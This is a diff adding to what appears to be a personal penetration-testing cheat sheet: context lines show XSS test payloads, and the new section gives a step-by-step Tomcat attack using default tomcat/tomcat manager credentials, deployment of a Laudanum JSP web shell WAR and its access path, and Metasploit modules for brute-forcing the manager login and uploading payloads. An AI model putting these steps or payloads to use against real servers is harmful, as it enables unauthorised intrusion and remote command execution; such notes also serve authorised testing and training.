@@ -285,3 +285,16 @@ xss
 <SVg/ONloAd = alert(1);>
 ";alert(2);//
 ';alert(1);//
+-----------------------------------------
+# Tomcat
+
+default port : 8080
+web site : ip/manager/html (defaul username,password / tomcat-tomcat)
+payload : /usr/share/webshells/laudanum/jsp/cmd.war - deploy payload
+web site payload : <ip>/cmd/cmd.jsp
+                    örnek: websitesi.com/cmd/cmd.jsp
+msfconsole:                    
+   scanner/http/tomcat_mgr_login : bruteforce
+   exploit/multi/http/tomcat_mgr_upload       
+   exploit/multi/http/tomcat_mgr_deploy
+   
